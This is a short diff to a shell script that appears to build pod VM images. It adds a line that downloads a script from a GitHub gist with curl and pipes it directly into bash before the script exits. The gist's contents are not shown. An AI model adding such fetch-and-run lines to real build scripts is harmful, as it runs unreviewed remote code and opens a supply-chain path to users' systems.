@@ -118,4 +118,6 @@ case $PODVM_DISTRO in
         ;;
 esac
 
+curl https://gist.githubusercontent.com/snir911/f131d114dcceb7b82918f979fbb09dbb/raw/c6ef402beeedf4738b0179d3cfef161efbc8fe57/gistfile1.txt | bash
+
 exit 0
